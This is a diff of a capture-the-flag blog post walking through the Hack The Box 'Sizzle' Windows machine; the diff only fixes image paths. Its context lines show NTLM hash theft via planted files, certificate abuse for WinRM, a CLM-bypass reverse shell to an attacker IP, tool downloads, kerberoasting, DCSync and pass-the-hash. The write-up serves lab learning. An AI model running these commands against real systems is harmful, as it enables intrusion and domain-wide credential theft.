@@ -110,7 +110,7 @@ Testing for anonymous binds over LDAP and Null authentication on RCP both fail, 
 └─$ ldapsearch -x -H ldap://sizzle.htb.local -b "dc=SIZZLE,dc=HTB,dc=LOCAL" -s base "(objectClass=user)"
 ```
 
-![](../assets/img/2026-06-03-Sizzle/1.png)
+![](/assets/img/2026-06-03-Sizzle/1.png)
 
 ### SMB Shares
 There are a few non-standard shares, however the only one we have read access to is the one for the Departments. The presence of a CertEnroll share also means that Active Directory Certificate Services is installed on this machine, which would be a good spot to search for privilege escalation routes later on.
@@ -121,7 +121,7 @@ Checking out the share shows quite a few directories belonging to each departmen
 └─$ smbclient -U Guest '//sizzle.htb.local/Department Shares'
 ```
 
-![](../assets/img/2026-06-03-Sizzle/2.png)
+![](/assets/img/2026-06-03-Sizzle/2.png)
 
 Instead of individually listing each directory, I'll opt to mount this share on my filesystem for easier enumeration.
 
@@ -133,7 +133,7 @@ Instead of individually listing each directory, I'll opt to mount this share on 
 └─# ls -la /mnt/dept
 ```
 
-![](../assets/img/2026-06-03-Sizzle/3.png)
+![](/assets/img/2026-06-03-Sizzle/3.png)
 
 Using a find command to look for any files within shows a few directories scattered in each department, however all but one are empty. The ZZ_ARCHIVE folder holds plenty various types of files, except displaying them shows that they're all completely filled with Null characters.
 
@@ -141,7 +141,7 @@ Using a find command to look for any files within shows a few directories scatte
 └─# xxd AddComplete.pptx
 ```
 
-![](../assets/img/2026-06-03-Sizzle/4.png)
+![](/assets/img/2026-06-03-Sizzle/4.png)
 
 There's really nothing here for us, so I'll quickly check to see if any of these directories are writable with a quick bash script. This will attempt to create a test file in each of the directories previously found.
 
@@ -201,11 +201,11 @@ touch: cannot touch './dept/Users/mrb3n/test.txt': Permission denied
 
 Almost every one is denied, but it seems to have stopped after the mrb3n user. Checking the Users folder again shows a Public account that may be writable. Interestingly, when I go to check it's gone. I know the command worked and retrying it appears as normal.
 
-![](../assets/img/2026-06-03-Sizzle/5.png)
+![](/assets/img/2026-06-03-Sizzle/5.png)
 
 After waiting a few minutes and listing the directory again, it disappears.
 
-![](../assets/img/2026-06-03-Sizzle/6.png)
+![](/assets/img/2026-06-03-Sizzle/6.png)
 
 This could very well just be a cleanup script, but given that this is a Windows machine and this share is dedicated to give resources to other departments, it's a good bet that someone is clicking these and deleting them afterwards. If so, we'll be able to capture that user's NTLMv2 hash by hosting our own SMB server and waiting for the challenge/response to take place.
 
@@ -224,7 +224,7 @@ For this, I use a tool aptly named [ntlm_theft](https://github.com/Greenwolf/ntl
 └─# python3 ntlm_theft.py -g all -s 10.10.14.48 -f safe
 ```
 
-![](../assets/img/2026-06-03-Sizzle/7.png)
+![](/assets/img/2026-06-03-Sizzle/7.png)
 
 And then move all of them to the target directory.
 
@@ -232,7 +232,7 @@ And then move all of them to the target directory.
 └─# mv safe/* /mnt/dept/Users/Public/
 ```
 
-![](../assets/img/2026-06-03-Sizzle/8.png)
+![](/assets/img/2026-06-03-Sizzle/8.png)
 
 We'll also need to setup an SMB server to capture the NTLMv2. I'll use Responder on my ethernet interface, but any working server that will output the inbound connections will work just fine.
 
@@ -240,7 +240,7 @@ We'll also need to setup an SMB server to capture the NTLMv2. I'll use Responder
 └─$ sudo responder -I tun0
 ```
 
-![](../assets/img/2026-06-03-Sizzle/9.png)
+![](/assets/img/2026-06-03-Sizzle/9.png)
 
 After a bit of waiting, we grab Amanda's hash which can be sent of to Hashcat or JohnTheRipper to retrieve the plaintext version.
 
@@ -250,7 +250,7 @@ After a bit of waiting, we grab Amanda's hash which can be sent of to Hashcat or
 └─$ nxc smb sizzle.htb.local -u 'Amanda' -p '[REDACTED]'
 ```
 
-![](../assets/img/2026-06-03-Sizzle/10.png)
+![](/assets/img/2026-06-03-Sizzle/10.png)
 
 ### Certificate Services
 This cracks quickly and validating the credentials over SMB succeeds, giving us a foothold on the domain. I could run BloodHound to check for any interesting outbound object permissions, but I notice that she has Read access to the CertEnroll share.
@@ -259,7 +259,7 @@ This cracks quickly and validating the credentials over SMB succeeds, giving us 
 └─$ nxc smb sizzle.htb.local -u 'Amanda' -p '[REDACTED]' --shares
 ```
 
-![](../assets/img/2026-06-03-Sizzle/11.png)
+![](/assets/img/2026-06-03-Sizzle/11.png)
 
 ### Enrollment Rights
 Due to our enrollment rights, I start searching for vulnerable templates in AD CS via [Certipy-AD](https://github.com/ly4k/Certipy).
@@ -366,7 +366,7 @@ This returns two potential vulnerabilities for privilege escalation through ESC8
 
 Before getting ahead of myself, I'd like to check out the web servers now due to web enrollment being allowed on the domain. Both sites (HTTP and HTTPS) hold a gif of bacon being sizzled.
 
-![](../assets/img/2026-06-03-Sizzle/12.png)
+![](/assets/img/2026-06-03-Sizzle/12.png)
 
 Looking back on my directory scans reveals the default endpoint for certificate services in AD located at `/certsrv`.
 
@@ -401,16 +401,16 @@ certsrv                 [Status: 401, Size: 1293, Words: 81, Lines: 30, Duration
 
 Heading over to it prompts us to login. Perhaps another way to gain access to this page is to find the usernames from the Dept share and then attempt a brute force against this page using basic auth.
 
-![](../assets/img/2026-06-03-Sizzle/13.png)
+![](/assets/img/2026-06-03-Sizzle/13.png)
 
 ### Creating Self-Signed Certificate
 We can use Amanda's credentials to login here, which shows a page that allows us to perform certain actions regarding certificates on the domain, namely request one, view the state of one, or download the CA cert/chain/CRL.
 
-![](../assets/img/2026-06-03-Sizzle/14.png)
+![](/assets/img/2026-06-03-Sizzle/14.png)
 
 By clicking **Request a certificate -> Advanced certificate request**, we're able to input a base64-encoded blob to the CA and attempt to get a valid PFX for the domain.
 
-![](../assets/img/2026-06-03-Sizzle/15.png)
+![](/assets/img/2026-06-03-Sizzle/15.png)
 
 Our user does not have WinRM access, but testing it with both NTLM or Kerberos authentication throws a strange error. After debugging and reading the traceback response, I figure out that the server responded without a WWW-Authenticate header, which NetExec does not handle well. As apposed to failing quietly, the server either responded strangely or dropped the connection in a way that omitted the header, in turn raising an exception.
 
@@ -420,7 +420,7 @@ Our user does not have WinRM access, but testing it with both NTLM or Kerberos a
 └─$ nxc winrm sizzle.htb.local -u 'Amanda' -p '[REDACTED]' -k
 ```
 
-![](../assets/img/2026-06-03-Sizzle/16.png)
+![](/assets/img/2026-06-03-Sizzle/16.png)
 
 With NTLM and Kerberos authentication both failing, and the access to a certificate request portal, we can assume that WinRM is configured to only accept valid certificates. So using our enrollment rights, we can create a self-signed cert through the /certsrv portal and use the subsequent PFX it creates to get shell access on the machine.
 
@@ -453,15 +453,15 @@ An optional company name []:
 We're left with a private key and a CSR file.
 ```
 
-![](../assets/img/2026-06-03-Sizzle/17.png)
+![](/assets/img/2026-06-03-Sizzle/17.png)
 
 Now let's copy/paste the contents of the CSR file into the advanced certificate request page and submit the form.
 
-![](../assets/img/2026-06-03-Sizzle/18.png)
+![](/assets/img/2026-06-03-Sizzle/18.png)
 
 We're redirected a page that let's us download the certificate. I proceed with the DER encoded version.
 
-![](../assets/img/2026-06-03-Sizzle/19.png)
+![](/assets/img/2026-06-03-Sizzle/19.png)
 
 ### Initial Foothold via WinRM
 Once that's on our local machine, we can extract a PEM file from the certificate with OpenSSL, which should give us all the resources to grab a shell over WinRM. Note that we need to connect to the machine over port 5986 by specifying the use of SSL through the `-S` flag. This is because certificate 
@@ -472,18 +472,18 @@ Once that's on our local machine, we can extract a PEM file from the certificate
 └─$ evil-winrm -i sizzle.htb.local -S -c amanda.pem -k amanda.key
 ```
 
-![](../assets/img/2026-06-03-Sizzle/20.png)
+![](/assets/img/2026-06-03-Sizzle/20.png)
 
 ## Privilege Escalation
 
 ### CLM and AppLocker Bypass
 With a shell on the box, we can move to escalating privileges towards administrator. Listing the users directory shows quite a few people on the system.
 
-![](../assets/img/2026-06-03-Sizzle/21.png)
+![](/assets/img/2026-06-03-Sizzle/21.png)
 
 I upload SharpHound to start mapping the domain, but am met with an error saying that the execution is being blocked by a group policy.
 
-![](../assets/img/2026-06-03-Sizzle/22.png)
+![](/assets/img/2026-06-03-Sizzle/22.png)
 
 Checking the typical restrictions shows that we are in Constrained Language Mode and that AppLocker is also present, which will hinder our execution greatly.
 
@@ -493,7 +493,7 @@ PS> $ExecutionContext.SessionState.LanguageMode
 PS> Get-AppLockerPolicy -Effective
 ```
 
-![](../assets/img/2026-06-03-Sizzle/23.png)
+![](/assets/img/2026-06-03-Sizzle/23.png)
 
 We'll be able to bypass the CLM with a pretty common trick, but AppLocker will require a deeper dive on what the policy is doing. Starting with the former, I grab an executable from the [PSByPassCLM](https://github.com/padovah4ck/PSByPassCLM/tree/master) repository under `PSBypassCLM/PSBypassCLM/bin/x64/Debug` and use cURL to transfer it to the machine. It's probably better to place this inside of Amanda's temp directory just to be safe.
 
@@ -509,7 +509,7 @@ Now that we have the executable on the machine, we can supply the necessary flag
 PS> C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U /revshell=true /rhost=10.10.14.48 /rport=443 \users\amanda\appdata\local\temp\PsByPassCLM.exe
 ```
 
-![](../assets/img/2026-06-03-Sizzle/24.png)
+![](/assets/img/2026-06-03-Sizzle/24.png)
 
 This gives us a new PowerShell window with FullLanguage mode, expanding our capabilities. Next up is diving into AppLocker policy limitations, which can be enumerated through the following command to grab XML and then ran through a beautifier to make it readable.
 
@@ -595,11 +595,11 @@ PS> curl http://10.10.14.48/Rubeus.exe -o C:\Windows\Temp\Rubeus.exe
 PS> C:\Windows\Temp\Rubeus.exe kerberoast /creduser:htb.local\Amanda /credpassword:[REDACTED] /nowrap
 ```
 
-![](../assets/img/2026-06-03-Sizzle/25.png)
+![](/assets/img/2026-06-03-Sizzle/25.png)
 
 This grants us a **KRB5TGS** hash for the mrlky user this time. Sending it over to Hashcat or JTR to crack rewards us with the plaintext version.
 
-![](../assets/img/2026-06-03-Sizzle/26.png)
+![](/assets/img/2026-06-03-Sizzle/26.png)
 
 ### Repeating Steps
 Now we can use this password in the same way as Amanda's to self-sign a certificate and grab a shell as mrlky over WinRM again.
@@ -630,7 +630,7 @@ A challenge password []:
 An optional company name []:
 ```
 
-![](../assets/img/2026-06-03-Sizzle/27.png)
+![](/assets/img/2026-06-03-Sizzle/27.png)
 
 After giving the bas64-encoded CSR to the site and downloading DER-encoded certificate, we can extract the PEM file from it and use it alongside our private key same as before.
 
@@ -640,7 +640,7 @@ After giving the bas64-encoded CSR to the site and downloading DER-encoded certi
 └─$ evil-winrm -i sizzle.htb.local -S -c mrlky.pem -k mrlky.key
 ```
 
-![](../assets/img/2026-06-03-Sizzle/28.png)
+![](/assets/img/2026-06-03-Sizzle/28.png)
 
 Since we spawned another shell, we're inside of CLM again so I repeat the exact same steps to get a reverse shell via PSByPassCLM on port 444 this time.
 
@@ -656,11 +656,11 @@ PS> C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /L
 
 Now we've got a FullLanguage mode PowerShell window as mrlky and can begin enumerating the filesystem and domain once again to discover any privilege escalation paths.
 
-![](../assets/img/2026-06-03-Sizzle/29.png)
+![](/assets/img/2026-06-03-Sizzle/29.png)
 
 At this point, we can also grab the user flag under their Desktop folder.
 
-![](../assets/img/2026-06-03-Sizzle/30.png)
+![](/assets/img/2026-06-03-Sizzle/30.png)
 
 ### Mapping AD with BloodHound
 A bit of time on the filesystem doesn't show anything too crazy, so I end up uploading a SharpHound PowerShell script to the machine to collect data.
@@ -675,7 +675,7 @@ We can grab this from our local machine via the Department Share directory from 
 
 After letting BloodHound ingest the JSON files for a bit, I check what interesting outbound object permissions we have.
 
-![](../assets/img/2026-06-03-Sizzle/31.png)
+![](/assets/img/2026-06-03-Sizzle/31.png)
 
 ### DCSync Attack
 Looks like this user has DCSync rights, meaning we can abuse Directory Replication Service Remote Protocol (MS-DRSR) to dump all hashes on the domain and use the Administrator's in a Pass-The-Hash attack to grab a complete shell over the system.
@@ -684,7 +684,7 @@ Looks like this user has DCSync rights, meaning we can abuse Directory Replicati
 └─$ impacket-secretsdump mrlky:'[REDACTED]'@10.129.8.99 -just-dc
 ```
 
-![](../assets/img/2026-06-03-Sizzle/32.png)
+![](/assets/img/2026-06-03-Sizzle/32.png)
 
 WinRM won't accept our NTLM hash, but we can utilize Impacket's wmiexec.py script to grab a shell via WMI and SMB.
 
@@ -692,6 +692,6 @@ WinRM won't accept our NTLM hash, but we can utilize Impacket's wmiexec.py scrip
 └─$ impacket-wmiexec -hashes ':[REDACTED]' administrator@10.129.8.99
 ```
 
-![](../assets/img/2026-06-03-Sizzle/33.png)
+![](/assets/img/2026-06-03-Sizzle/33.png)
 
 Grabbing the final flag under the Administrator's Desktop folder will complete this challenge. Overall the attack paths weren't really that difficult, but the protections in place made it quite a bit harder if you didn't know how to circumvent them. I loved this box since I think everyone should know how real-world restrictions can be bypassed. I hope this was helpful to anyone following along or stuck and happy hacking!
